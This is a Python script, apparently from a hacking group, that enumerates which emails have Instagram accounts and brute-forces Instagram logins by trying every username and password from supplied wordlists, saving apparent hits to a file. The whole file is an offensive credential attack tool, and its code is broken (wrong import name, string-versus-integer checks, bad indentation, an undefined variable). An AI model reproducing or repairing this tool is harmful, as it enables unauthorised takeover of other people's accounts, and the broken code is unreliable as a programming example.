# CodEd By : hex!~5o6

try:
    import request
except:
    print(' install Requests')

logo = '''
---------------------------------------
     [+] instagram Login [+]
     [+] -1 Email Found ? [+]
     [+] -2 Login ? [+]
     [+]  Alqwat Team ; [+]
---------------------------------------
'''
print(logo)

raw = raw_input('..[] : ')
if raw == 1:
    print(' >> You need Found Email ? Y / N : ')
    raw1 = raw_input('.. : ')
    if raw1 == 'Y':
        rax = raw_input('<< Enter list Email :')
        orx = open(rax,'r').readlines()
        for i in orx:
            i = i.strip()
            sreg = 'https://www.instagram.com/accounts/fb_linked_account/?check_email='+i
            re = requests.get(sreg).text
            x = re[0:22]
            if 'false' in x:
                print('[+] Not Found Email :'+i)
            else:
                print('>> Found Email : '+i)
                ope2 = open('EmailFoun.txt','a').write(i+'\n')
    else:
        xxx = raw_input('... Exit >>> ...')
else:
    print('........ Error ')
if raw == 2:
    print('[+] Check UsEr or email or password [+] ..')
    raz = raw_input('[+] Enter name Email or User oR Phone : ')
    raz1 = raw_input(' >> Enter list Password : ')
    op = open(raz,'r').readlines()
    op2 = open(raz1,'r').readlines()
    for x in op:
        x = x.strip()
        for iz in op2:
            iz = iz.strip()
          url = 'https://www.instagram.com/accounts/login/'
          pa = {
            'username':x,
            'password':iz
             }
          rz = requests.post(url,data=pa)
          zzz = 'https://www.instagram.com/accounts/registered/'
          iC = requests.get(zzz).text
          if 'Add a profile photo' in iC:
              urls = 'https://www.instagram.com/accounts/logout/'
              e = requests.get(urls)
              print(' USer : '+z+' Pass : '+iz)
              opem = open('Ex.txt','a').write(z+' : '+iz+'\n')
          else:
              print(' NOOt > : '+z+' : '+iz)
else:
    print('.........Error ')
          



          
